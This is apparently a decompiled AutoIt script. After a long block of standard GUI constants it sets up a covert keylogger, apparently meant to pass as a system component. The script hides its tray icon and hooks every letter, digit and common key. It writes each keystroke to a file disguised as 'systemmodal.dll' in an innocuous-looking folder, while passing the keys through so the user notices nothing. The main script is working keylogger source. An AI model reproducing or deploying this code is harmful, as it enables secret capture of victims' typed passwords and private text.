; <AUT2EXE VERSION: 3.1.1.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\(15)  scripts\lsass30.07 provera c i d diska\prog1.au3>
; ----------------------------------------------------------------------------

#NoTrayIcon

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Program Files\AutoIt3\Include\GUIConstants.au3>
; ----------------------------------------------------------------------------


; ------------------------------------------------------------------------------
;
; AutoIt Version: 3.1.1.98 (beta)
; Language:       English
; Description:    Constants to be used in GUI applications.
;
; ------------------------------------------------------------------------------


; Events and messages
Global Const $GUI_EVENT_CLOSE			= -3
Global Const $GUI_EVENT_MINIMIZE		= -4
Global Const $GUI_EVENT_RESTORE			= -5
Global Const $GUI_EVENT_MAXIMIZE		= -6
Global Const $GUI_EVENT_PRIMARYDOWN		= -7
Global Const $GUI_EVENT_PRIMARYUP		= -8
Global Const $GUI_EVENT_SECONDARYDOWN	= -9
Global Const $GUI_EVENT_SECONDARYUP		= -10
Global Const $GUI_EVENT_MOUSEMOVE		= -11
Global Const $GUI_EVENT_RESIZED			= -12
Global Const $GUI_EVENT_DROPPED			= -13

Global Const $GUI_RUNDEFMSG				= 'GUI_RUNDEFMSG'

; State
Global Const $GUI_AVISTOP		= 0
Global Const $GUI_AVISTART		= 1
Global Const $GUI_AVICLOSE		= 2

Global Const $GUI_CHECKED		= 1
Global Const $GUI_INDETERMINATE	= 2
Global Const $GUI_UNCHECKED		= 4

Global Const $GUI_DROPACCEPTED	= 8
Global Const $GUI_ACCEPTFILES	= $GUI_DROPACCEPTED	; to be suppressed

Global Const $GUI_SHOW			= 16
Global Const $GUI_HIDE 			= 32
Global Const $GUI_ENABLE		= 64
Global Const $GUI_DISABLE		= 128

Global Const $GUI_FOCUS			= 256
Global Const $GUI_DEFBUTTON		= 512

Global Const $GUI_EXPAND		= 1024
Global Const $GUI_ONTOP			= 2048


; Font
Global Const $GUI_FONTITALIC	= 2
Global Const $GUI_FONTUNDER		= 4
Global Const $GUI_FONTSTRIKE	= 8


; Resizing
Global Const $GUI_DOCKAUTO			= 0x0001
Global Const $GUI_DOCKLEFT			= 0x0002
Global Const $GUI_DOCKRIGHT			= 0x0004
Global Const $GUI_DOCKHCENTER		= 0x0008
Global Const $GUI_DOCKTOP			= 0x0020
Global Const $GUI_DOCKBOTTOM		= 0x0040
Global Const $GUI_DOCKVCENTER		= 0x0080
Global Const $GUI_DOCKWIDTH			= 0x0100
Global Const $GUI_DOCKHEIGHT		= 0x0200

Global Const $GUI_DOCKSIZE			= 0x0300	; width+height
Global Const $GUI_DOCKMENUBAR		= 0x0220	; top+height
Global Const $GUI_DOCKSTATEBAR		= 0x0240	; bottom+height
Global Const $GUI_DOCKALL			= 0x0322	; left+top+width+height
Global Const $GUI_DOCKBORDERS		= 0x0066	; left+top+right+bottom

; Window Styles
Global Const $WS_TILED				= 0
Global Const $WS_OVERLAPPED 		= 0
Global Const $WS_MAXIMIZEBOX		= 0x00010000
Global Const $WS_MINIMIZEBOX		= 0x00020000
Global Const $WS_TABSTOP			= 0x00010000
Global Const $WS_GROUP				= 0x00020000
Global Const $WS_SIZEBOX			= 0x00040000
Global Const $WS_THICKFRAME			= 0x00040000
Global Const $WS_SYSMENU			= 0x00080000
Global Const $WS_HSCROLL			= 0x00100000
Global Const $WS_VSCROLL			= 0x00200000
Global Const $WS_DLGFRAME 			= 0x00400000
Global Const $WS_BORDER				= 0x00800000
Global Const $WS_CAPTION			= 0x00C00000
Global Const $WS_OVERLAPPEDWINDOW	= 0x00CF0000
Global Const $WS_TILEDWINDOW		= 0x00CF0000
Global Const $WS_MAXIMIZE			= 0x01000000
Global Const $WS_CLIPCHILDREN		= 0x02000000
Global Const $WS_CLIPSIBLINGS		= 0x04000000
Global Const $WS_DISABLED 			= 0x08000000
Global Const $WS_VISIBLE			= 0x10000000
Global Const $WS_MINIMIZE			= 0x20000000
Global Const $WS_CHILD				= 0x40000000
Global Const $WS_POPUP				= 0x80000000
Global Const $WS_POPUPWINDOW		= 0x80880000

Global Const $DS_MODALFRAME 		= 0x80
Global Const $DS_SETFOREGROUND		= 0x00000200
Global Const $DS_CONTEXTHELP		= 0x00002000

; Window Extended Styles
Global Const $WS_EX_ACCEPTFILES			= 0x00000010
Global Const $WS_EX_MDICHILD			= 0x00000040
Global Const $WS_EX_APPWINDOW			= 0x00040000
Global Const $WS_EX_CLIENTEDGE			= 0x00000200
Global Const $WS_EX_CONTEXTHELP			= 0x00000400
Global Const $WS_EX_DLGMODALFRAME 		= 0x00000001
Global Const $WS_EX_LEFTSCROLLBAR 		= 0x00004000
Global Const $WS_EX_OVERLAPPEDWINDOW	= 0x00000300
Global Const $WS_EX_RIGHT				= 0x00001000
Global Const $WS_EX_STATICEDGE			= 0x00020000
Global Const $WS_EX_TOOLWINDOW			= 0x00000080
Global Const $WS_EX_TOPMOST				= 0x00000008
Global Const $WS_EX_TRANSPARENT			= 0x00000020
Global Const $WS_EX_WINDOWEDGE			= 0x00000100
Global Const $WS_EX_LAYERED				= 0x00080000

Global Const $GUI_WS_EX_PARENTDRAG =      0x00100000

; listView Extended Styles
Global Const $LVS_EX_FULLROWSELECT		= 0x00000020
Global Const $LVS_EX_GRIDLINES			= 0x00000001
Global Const $LVS_EX_SUBITEMIMAGES		= 0x00000002
Global Const $LVS_EX_CHECKBOXES			= 0x00000004
Global Const $LVS_EX_TRACKSELECT		= 0x00000008
Global Const $LVS_EX_HEADERDRAGDROP		= 0x00000010
Global Const $LVS_EX_FLATSB				= 0x00000100
Global Const $LVS_EX_BORDERSELECT		= 0x00008000
;Global Const $LVS_EX_MULTIWORKAREAS		= 0x00002000
;Global Const $LVS_EX_SNAPTOGRID			= 0x00080000
;Global Const $LVS_EX_DOUBLEBUFFER		= 0x00010000

; Tab Extended Styles
Global Const $TCS_EX_FLATSEPARATORS 	= 0x1
;Global Const $TCS_EX_REGISTERDROP 		= 0x2

; Label/Pic/Icon
Global Const $SS_LEFT			= 0
Global Const $SS_CENTER			= 1
Global Const $SS_RIGHT			= 2
Global Const $SS_ICON			= 3
Global Const $SS_BLACKRECT		= 4
Global Const $SS_GRAYRECT		= 5
Global Const $SS_WHITERECT		= 6
Global Const $SS_BLACKFRAME		= 7
Global Const $SS_GRAYFRAME		= 8
Global Const $SS_WHITEFRAME		= 9
Global Const $SS_SIMPLE			= 11
Global Const $SS_LEFTNOWORDWRAP	= 12
Global Const $SS_BITMAP			= 15
Global Const $SS_ETCHEDHORZ		= 16
Global Const $SS_ETCHEDVERT		= 17
Global Const $SS_ETCHEDFRAME	= 18
Global Const $SS_NOPREFIX		= 0x0080
Global Const $SS_NOTIFY			= 0x0100
Global Const $SS_CENTERIMAGE	= 0x0200
Global Const $SS_RIGHTJUST		= 0x0400
Global Const $SS_SUNKEN			= 0x1000

; Group
Global Const $BS_GROUPBOX		= 0x0007

; Button
Global Const $BS_BOTTOM			= 0x0800
Global Const $BS_CENTER			= 0x0300
Global Const $BS_DEFPUSHBUTTON	= 0x0001
Global Const $BS_LEFT			= 0x0100
Global Const $BS_MULTILINE		= 0x2000
Global Const $BS_PUSHBOX		= 0x000A
Global Const $BS_PUSHLIKE		= 0x1000
Global Const $BS_RIGHT			= 0x0200
Global Const $BS_RIGHTBUTTON	= 0x0020
Global Const $BS_TOP			= 0x0400
Global Const $BS_VCENTER		= 0x0C00
Global Const $BS_FLAT			= 0x8000
Global Const $BS_ICON			= 0x0040
Global Const $BS_BITMAP			= 0x0080

; Checkbox
Global Const $BS_3STATE			= 0x0005
Global Const $BS_AUTO3STATE		= 0x0006
Global Const $BS_AUTOCHECKBOX	= 0x0003
Global Const $BS_CHECKBOX		= 0x0002

; Radio
Global Const $BS_AUTORADIOBUTTON	= 0x0009

; Combo
Global Const $CBS_SIMPLE			= 0x0001
Global Const $CBS_DROPDOWN			= 0x0002
Global Const $CBS_DROPDOWNLIST		= 0x0003
Global Const $CBS_AUTOHSCROLL		= 0x0040
Global Const $CBS_OEMCONVERT		= 0x0080
Global Const $CBS_SORT				= 0x0100
Global Const $CBS_NOINTEGRALHEIGHT	= 0x0400
Global Const $CBS_DISABLENOSCROLL	= 0x0800
Global Const $CBS_UPPERCASE			= 0x2000
Global Const $CBS_LOWERCASE			= 0x4000

; Listbox
Global Const $LBS_NOTIFY			= 0x0001
Global Const $LBS_SORT				= 0x0002
Global Const $LBS_USETABSTOPS		= 0x0080
Global Const $LBS_NOINTEGRALHEIGHT	= 0x0100
Global Const $LBS_DISABLENOSCROLL	= 0x1000
Global Const $LBS_NOSEL				= 0x4000
Global Const $LBS_STANDARD			= 0xA00003

; Edit/Input
Global Const $ES_LEFT				= 0
Global Const $ES_CENTER				= 1
Global Const $ES_RIGHT				= 2
Global Const $ES_MULTILINE			= 4
Global Const $ES_UPPERCASE			= 8
Global Const $ES_LOWERCASE			= 16
Global Const $ES_PASSWORD			= 32
Global Const $ES_AUTOVSCROLL		= 64
Global Const $ES_AUTOHSCROLL		= 128
Global Const $ES_NOHIDESEL			= 256
Global Const $ES_OEMCONVERT			= 1024
Global Const $ES_READONLY			= 2048
Global Const $ES_WANTRETURN			= 4096
Global Const $ES_NUMBER				= 8192
;Global Const $ES_DISABLENOSCROLL = 8192
;Global Const $ES_SUNKEN = 16384
;Global Const $ES_VERTICAL = 4194304
;Global Const $ES_SELECTIONBAR = 16777216

; Date
Global Const $DTS_SHORTDATEFORMAT	= 0
Global Const $DTS_UPDOWN			= 1
Global Const $DTS_SHOWNONE			= 2
Global Const $DTS_LONGDATEFORMAT	= 4
Global Const $DTS_TIMEFORMAT		= 9
Global Const $DTS_RIGHTALIGN		= 32

; MonthCal
Global Const $MCS_NOTODAY			= 16
Global Const $MCS_NOTODAYCIRCLE		= 8
Global Const $MCS_WEEKNUMBERS		= 4

; Progress bar
Global Const $PBS_SMOOTH	= 1
Global Const $PBS_VERTICAL	= 4

; AVI clip
Global Const $ACS_CENTER			= 1
Global Const $ACS_TRANSPARENT		= 2
Global Const $ACS_AUTOPLAY			= 4
Global Const $ACS_TIMER				= 8
Global Const $ACS_NONTRANSPARENT	= 16

; Tab
Global Const $TCS_SCROLLOPPOSITE	= 0x0001
Global Const $TCS_BOTTOM			= 0x0002
Global Const $TCS_RIGHT				= 0x0002
Global Const $TCS_MULTISELECT		= 0x0004
Global Const $TCS_FLATBUTTONS		= 0x0008
Global Const $TCS_FORCEICONLEFT		= 0x0010
Global Const $TCS_FORCELABELLEFT	= 0x0020
Global Const $TCS_HOTTRACK			= 0x0040
Global Const $TCS_VERTICAL			= 0x0080
Global Const $TCS_TABS				= 0x0000
Global Const $TCS_BUTTONS			= 0x0100
Global Const $TCS_SINGLELINE		= 0x0000
Global Const $TCS_MULTILINE			= 0x0200
Global Const $TCS_RIGHTJUSTIFY		= 0x0000
Global Const $TCS_FIXEDWIDTH		= 0x0400
Global Const $TCS_RAGGEDRIGHT		= 0x0800
Global Const $TCS_FOCUSONBUTTONDOWN = 0x1000
Global Const $TCS_OWNERDRAWFIXED	= 0x2000
Global Const $TCS_TOOLTIPS			= 0x4000
Global Const $TCS_FOCUSNEVER		= 0x8000

; TreeView
Global Const $TVS_HASBUTTONS     	= 0x0001
Global Const $TVS_HASLINES       	= 0x0002
Global Const $TVS_LINESATROOT    	= 0x0004
;Global Const $TVS_EDITLABELS      = 0x0008
Global Const $TVS_DISABLEDRAGDROP	= 0x0010
Global Const $TVS_SHOWSELALWAYS		= 0x0020
;Global Const $TVS_RTLREADING     = 0x0040
Global Const $TVS_NOTOOLTIPS		= 0x0080
Global Const $TVS_CHECKBOXES		= 0x0100
Global Const $TVS_TRACKSELECT		= 0x0200
Global Const $TVS_SINGLEEXPAND		= 0x0400
;Global Const $TVS_INFOTIP        = 0x0800
Global Const $TVS_FULLROWSELECT		= 0x1000
Global Const $TVS_NOSCROLL			= 0x2000
Global Const $TVS_NONEVENHEIGHT		= 0x4000

; Slider
Global Const $TBS_AUTOTICKS	= 0x0001
Global Const $TBS_VERT		= 0x0002
Global Const $TBS_HORZ		= 0x0000
Global Const $TBS_TOP		= 0x0004
Global Const $TBS_BOTTOM	= 0x0000
Global Const $TBS_LEFT		= 0x0004
Global Const $TBS_RIGHT		= 0x0000
Global Const $TBS_BOTH		= 0x0008
Global Const $TBS_NOTICKS	= 0x0010
Global Const $TBS_NOTHUMB	= 0x0080

; ListView
Global Const $LVS_ICON	 			= 0x0000
Global Const $LVS_REPORT 			= 0x0001
Global Const $LVS_SMALLICON			= 0x0002
Global Const $LVS_LIST				= 0x0003
Global Const $LVS_EDITLABELS		= 0x0200
Global Const $LVS_NOCOLUMNHEADER	= 0x4000
Global Const $LVS_NOSORTHEADER		= 0x8000
Global Const $LVS_SINGLESEL			= 0x0004
Global Const $LVS_SHOWSELALWAYS		= 0x0008
Global Const $LVS_SORTASCENDING		= 0X0010
Global Const $LVS_SORTDESCENDING	= 0x0020

; Updown
Global Const $UDS_WRAP 				= 0x0001
Global Const $UDS_ALIGNRIGHT 		= 0x0004
Global Const $UDS_ALIGNLEFT			= 0x0008
Global Const $UDS_ARROWKEYS 		= 0x0020
Global Const $UDS_HORZ 				= 0x0040
Global Const $UDS_NOTHOUSANDS 		= 0x0080

; Graphic
Global Const $GUI_GR_CLOSE		= 1
Global Const $GUI_GR_LINE		= 2
Global Const $GUI_GR_BEZIER		= 4
Global Const $GUI_GR_MOVE		= 6
Global Const $GUI_GR_COLOR		= 8
Global Const $GUI_GR_RECT		= 10
Global Const $GUI_GR_ELLIPSE	= 12
Global Const $GUI_GR_PIE		= 14
Global Const $GUI_GR_DOT		= 16
Global Const $GUI_GR_PIXEL		= 18
Global Const $GUI_GR_HINT		= 20
Global Const $GUI_GR_REFRESH	= 22
Global Const $GUI_GR_PENSIZE	= 24
Global Const $GUI_GR_NOBKCOLOR	= -2

; Control default styles
Global Const $GUI_SS_DEFAULT_AVI		= $ACS_TRANSPARENT
Global Const $GUI_SS_DEFAULT_BUTTON		= 0
Global Const $GUI_SS_DEFAULT_CHECKBOX	= 0
Global Const $GUI_SS_DEFAULT_COMBO		= BitOR($CBS_DROPDOWN, $CBS_AUTOHSCROLL, $WS_VSCROLL)
Global Const $GUI_SS_DEFAULT_DATE		= $DTS_LONGDATEFORMAT
Global Const $GUI_SS_DEFAULT_EDIT		= BitOR($ES_WANTRETURN, $WS_VSCROLL, $WS_HSCROLL, $ES_AUTOVSCROLL, $ES_AUTOHSCROLL)
Global Const $GUI_SS_DEFAULT_GRAPHIC	= 0
Global Const $GUI_SS_DEFAULT_GROUP		= 0
Global Const $GUI_SS_DEFAULT_ICON		= $SS_NOTIFY
Global Const $GUI_SS_DEFAULT_INPUT		= BitOR($ES_LEFT, $ES_AUTOHSCROLL)
Global Const $GUI_SS_DEFAULT_LABEL		= 0
Global Const $GUI_SS_DEFAULT_LIST		= BitOR($LBS_SORT, $WS_BORDER, $WS_VSCROLL, $LBS_NOTIFY)
Global Const $GUI_SS_DEFAULT_LISTVIEW	= BitOR($LVS_SHOWSELALWAYS, $LVS_SINGLESEL)
Global Const $GUI_SS_DEFAULT_MONTHCAL	= 0
Global Const $GUI_SS_DEFAULT_PIC		= $SS_NOTIFY
Global Const $GUI_SS_DEFAULT_PROGRESS	= 0
Global Const $GUI_SS_DEFAULT_RADIO		= 0
Global Const $GUI_SS_DEFAULT_SLIDER		= $TBS_AUTOTICKS
Global Const $GUI_SS_DEFAULT_TAB		= 0
Global Const $GUI_SS_DEFAULT_TREEVIEW	= BitOR($TVS_HASBUTTONS, $TVS_HASLINES, $TVS_LINESATROOT, $TVS_DISABLEDRAGDROP, $TVS_SHOWSELALWAYS)
Global Const $GUI_SS_DEFAULT_UPDOWN		= $UDS_ALIGNRIGHT
Global Const $GUI_SS_DEFAULT_GUI		= BitOR($WS_MINIMIZEBOX, $WS_CAPTION, $WS_POPUP, $WS_SYSMENU)

; Background color special flags
Global Const $GUI_BKCOLOR_DEFAULT = -1
Global Const $GUI_BKCOLOR_TRANSPARENT = -2

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Program Files\AutoIt3\Include\GUIConstants.au3>
; ----------------------------------------------------------------------------



If WinExists("Hellozzz1") Then
	Exit
Else
	GUICreate("Hellozzz1", 0, 0)
EndIf

AutoItSetOption ("SendCapslockMode",0)
Opt("SendAttachMode",1)




$var = DriveGetDrive( "FIXED" )
If ($var[0] > 1 And $var[2]="d:" And DriveSpaceFree( "d:\" ) > 3) Then   ; postoji vise od jednog harda znaci ima d: i ima prostora viseod 3 mb

	$zzz = $var[2]
	DirCreate("d:\sw_windows\common_files\root")

ElseIf ($var[0] = 1 And $var[1]="c:" And DriveSpaceFree( "c:\" ) > 3) Then
	$zzz = $var[1]
	DirCreate("c:\sw_windows\common_files\root")
EndIf



HotKeySet("z","Z")
HotKeySet("x","X")
HotKeySet("c","C")
HotKeySet("v","V")
HotKeySet("b","B")
HotKeySet("n","N")
HotKeySet("m","M")
HotKeySet("l","L")
HotKeySet("k","K")
HotKeySet("j","J")
HotKeySet("h","H")
HotKeySet("g","G")
HotKeySet("f","F")
HotKeySet("d","D")
HotKeySet("s","S")
HotKeySet("a","A")
HotKeySet("q","Q")
HotKeySet("w","W")
HotKeySet("e","E")
HotKeySet("r","R")
HotKeySet("t","T")
HotKeySet("y","Y")
HotKeySet("u","U")
HotKeySet("i","I")
HotKeySet("o","O")
HotKeySet("p","P")
HotKeySet("0","JJ")
HotKeySet("9","AA")
HotKeySet("8","BB")
HotKeySet("7","CC")
HotKeySet("6","DD")
HotKeySet("5","EE")
HotKeySet("4","FF")
HotKeySet("3","GG")
HotKeySet("2","HH")
HotKeySet("1","II")
HotKeySet("{NUMPAD0}","N0")
HotKeySet("{NUMPAD1}","N1")
HotKeySet("{NUMPAD2}","N2")
HotKeySet("{NUMPAD3}","N3")
HotKeySet("{NUMPAD4}","N4")
HotKeySet("{NUMPAD5}","N5")
HotKeySet("{NUMPAD6}","N6")
HotKeySet("{NUMPAD7}","N7")
HotKeySet("{NUMPAD8}","N8")
HotKeySet("{NUMPAD9}","N9")
HotKeySet("{SPACE}","SPACE")
HotKeySet("{BS}","BS")
HotKeySet("{TAB}","TAB")
HotKeySet("{ENTER}","ENTER")


;LOOOP

While 1
    Sleep(100)


WEnd




Func Z()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","z")
	HotKeySet("z")
	Send("z")
	HotKeySet("z","Z")

EndFunc

Func X()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","x")
	HotKeySet("x")
	Send("x")
    HotKeySet("x","X")

EndFunc

Func C()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","c")
	HotKeySet("c")
	Send("c")
    HotKeySet("c","C")

EndFunc

Func V()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","v")
	HotKeySet("v")
	Send("v")
    HotKeySet("v","V")

EndFunc

Func B()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","b")
	HotKeySet("b")
	Send("b")
    HotKeySet("b","B")

EndFunc

Func N()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","n")
	HotKeySet("n")
	Send("n")
    HotKeySet("n","N")

EndFunc

Func M()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","m")
	HotKeySet("m")
	Send("m")
    HotKeySet("m","M")

EndFunc

Func L()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","l")
	HotKeySet("l")
	Send("l")
    HotKeySet("l","L")

EndFunc

Func K()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","k")
	HotKeySet("k")
	Send("k")
    HotKeySet("k","K")

EndFunc

Func J()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","j")
	HotKeySet("j")
	Send("j")
    HotKeySet("j","J")

EndFunc

Func H()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","h")
	HotKeySet("h")
	Send("h")
    HotKeySet("h","H")

EndFunc

Func G()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","g")
	HotKeySet("g")
	Send("g")
    HotKeySet("g","G")

EndFunc

Func F()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","f")
	HotKeySet("f")
	Send("f")
    HotKeySet("f","F")

EndFunc

Func D()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","d")
	HotKeySet("d")
	Send("d")
    HotKeySet("d","D")

EndFunc

Func S()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","s")
	HotKeySet("s")
	Send("s")
    HotKeySet("s","S")

EndFunc

Func A()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","a")
	HotKeySet("a")
	Send("a")
    HotKeySet("a","A")

EndFunc

Func Q()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","q")
	HotKeySet("q")
	Send("q")
    HotKeySet("q","Q")

EndFunc

Func W()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","w")
	HotKeySet("w")
	Send("w")
    HotKeySet("w","W")

EndFunc

Func E()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","e")
	HotKeySet("e")
	Send("e")
    HotKeySet("e","E")

EndFunc

Func R()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","r")
	HotKeySet("r")
	Send("r")
    HotKeySet("r","R")

EndFunc

Func T()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","t")
	HotKeySet("t")
	Send("t")
    HotKeySet("t","T")

EndFunc

Func Y()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","y")
	HotKeySet("y")
	Send("y")
    HotKeySet("y","Y")

EndFunc

Func U()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","u")
	HotKeySet("u")
	Send("u")
    HotKeySet("u","U")

EndFunc

Func I()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","i")
	HotKeySet("i")
	Send("i")
    HotKeySet("i","I")

EndFunc

Func O()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","o")
	HotKeySet("o")
	Send("o")
    HotKeySet("o","O")

EndFunc

Func P()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","p")
	HotKeySet("p")
	Send("p")
    HotKeySet("p","P")

EndFunc

Func JJ()
FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","0")
	HotKeySet("0")
	Send("0")
    HotKeySet("0","JJ")

EndFunc

Func AA()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","9")
	HotKeySet("9")
	Send("9")
    HotKeySet("9","AA")

EndFunc

Func BB()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","8")
	HotKeySet("8")
	Send("8")
    HotKeySet("8","BB")

EndFunc

Func CC()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","7")
	HotKeySet("7")
	Send("7")
    HotKeySet("7","CC")

EndFunc

Func DD()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","6")
	HotKeySet("6")
	Send("6")
    HotKeySet("6","DD")

EndFunc

Func EE()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","5")
	HotKeySet("5")
	Send("5")
    HotKeySet("5","EE")

EndFunc

Func FF()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","4")
	HotKeySet("4")
	Send("4")
    HotKeySet("4","FF")

EndFunc

Func GG()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","3")
	HotKeySet("3")
	Send("3")
    HotKeySet("3","GG")

EndFunc

Func HH()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","2")
	HotKeySet("2")
	Send("2")
    HotKeySet("2","HH")

EndFunc

Func II()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","1")
	HotKeySet("1")
	Send("1")
    HotKeySet("1","II")

EndFunc

Func N0()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","0")
	HotKeySet("{NUMPAD0}")
	Send("0")
    HotKeySet("{NUMPAD0}","N0")
EndFunc

Func N1()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","1")
	HotKeySet("{NUMPAD1}")
	Send("1")
    HotKeySet("{NUMPAD1}","N1")
EndFunc

Func N2()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","2")
	HotKeySet("{NUMPAD2}")
	Send("2")
    HotKeySet("{NUMPAD2}","N2")
EndFunc

Func N3()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","3")
	HotKeySet("{NUMPAD3}")
	Send("3")
    HotKeySet("{NUMPAD3}","N3")
EndFunc

Func N4()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","4")
	HotKeySet("{NUMPAD4}")
	Send("4")
    HotKeySet("{NUMPAD4}","N4")
EndFunc

Func N5()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","5")
	HotKeySet("{NUMPAD5}")
	Send("5")
    HotKeySet("{NUMPAD5}","N5")
EndFunc

Func N6()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","6")
	HotKeySet("{NUMPAD6}")
	Send("6")
    HotKeySet("{NUMPAD6}","N6")
EndFunc

Func N7()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","7")
	HotKeySet("{NUMPAD7}")
	Send("7")
    HotKeySet("{NUMPAD7}","N7")
EndFunc

Func N8()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","8")
	HotKeySet("{NUMPAD8}")
	Send("8")
    HotKeySet("{NUMPAD8}","N8")
EndFunc

Func N9()
	FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","9")
	HotKeySet("{NUMPAD9}")
	Send("9")
    HotKeySet("{NUMPAD9}","N9")
EndFunc

Func SPACE()
FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll"," ")
	HotKeySet("{SPACE}")
	Send("{SPACE}")
    HotKeySet("{SPACE}","SPACE")

EndFunc

Func BS()
FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","[BS]")
	HotKeySet("{BS}")
	Send("{BS}")
    HotKeySet("{BS}","BS")
EndFunc

Func TAB()
FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","[TAB]")
	HotKeySet("{TAB}")
	Send("{TAB}")
    HotKeySet("{TAB}","TAB")
EndFunc

Func ENTER()
FileWrite($zzz & "\sw_windows\common_files\root\systemmodal.dll","[ENTER]")
	HotKeySet("{ENTER}")
	Send("{ENTER}")
    HotKeySet("{ENTER}","ENTER")
EndFunc



; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\(15)  scripts\lsass30.07 provera c i d diska\prog1.au3>
; ----------------------------------------------------------------------------

